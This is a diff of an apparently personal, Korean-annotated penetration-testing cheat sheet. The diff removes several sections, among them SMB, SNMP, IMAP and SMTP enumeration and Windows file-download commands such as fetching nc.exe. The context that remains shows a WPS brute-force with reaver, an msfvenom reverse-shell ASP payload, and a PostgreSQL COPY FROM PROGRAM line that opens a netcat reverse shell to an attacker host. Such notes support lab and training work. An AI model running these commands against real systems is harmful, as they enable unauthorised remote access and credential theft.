@@ -5,11 +5,6 @@ reaver -i <monitor mode interface> -b <target's MAC adress> -vv
 - WPS(Wi-Fi Protected Setup)의 PIN을 이용해 무선 라우터의 WPS 인증을 브루트포스(무차별 대입) 하려는 도구
 - 성공하면 라우터의 WPS PIN을 얻고 그로부터 WPA/WPA2 프리-쉐어드키(비밀번호)를 획득
 ---
-# smbmap
-```bash
-smbmap -u '' -p '' -H <ip> -r --depth 5
-```
----
 # grep
 ```bash
 grep -r . 2>/dev/null
@@ -20,15 +15,6 @@ grep -r . 2>/dev/null
 python3 spose.py --proxy http://10.10.11.131:3128 --target 10.10.11.131
 ```
 - https://github.com/aancw/spose
----
-# Windows Download Command
-```powershell
-certutil -urlcache -f -split <target>
-
-Invoke-WebRequest <target> -OutFile <Path>
-
-curl http://example.com/nc.exe -o nc.exe
-```
 
 ---
 # exiftool
@@ -181,31 +167,6 @@ Rename-Item -Path <String> -NewName <String>
 Remove-Item -Path "C:\Path\To\YourFile.txt"
 ```
 ---
-# SNMP(Simple Network Management Protocol)
-- 네트워크 장비(라우터, 스위치, 서버, 프린터 등)를 관리 및 모니터링하기 위한 표준 프로토콜
-```bash
-snmp-check <ip>
-```
----
-# IMAP3
-```bash
-telnet <ip> 143
-
-a LOGIN <id> <password>
-
-a LIST "" *
-
-a SELECT INBOX
-
-a SEARCH ALL
-
-a fetch <NUMBER> body[header]
-
-a fetch <NUMBER> body[text]
-
-a LOGOUT
-```
----
 # cadaver(IIS server /webdav exploit)
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.6.2 LPORT=4444 -f asp > shell.asp
@@ -232,11 +193,6 @@ postgres=# COPY cmd_exec FROM PROGRAM 'nc -n <kali IP> 5437 -e /usr/bin/bash';
 cewl -d 5 -m 3 http://postfish.off/team.html -w /home/kali/Desktop/cewl.txt
 ```
 ---
-# SMTP User Enum
-```bash
-perl smtp-user-enum.pl -M VRFY -U /home/kali/Desktop/known-users -t 192.168.211.137
-```
----
 # swaks(send mail tool)
 ```bash
 swaks --server smtp.example.com \
@@ -244,12 +200,6 @@ swaks --server smtp.example.com \
       --to you@example.com \
       --auth LOGIN --auth-user me@example.com --auth-password "비밀번호" \
       --attach @test.txt
-```
----
-# VNC(Virtual Network Computing)
-- 네트워크를 통해*다른 컴퓨터 화면을 공유하고 원격 제어할 수 있는 기술  
-```bash
-vncviewer 192.168.0.10:1
 ```
 ---
 # scp
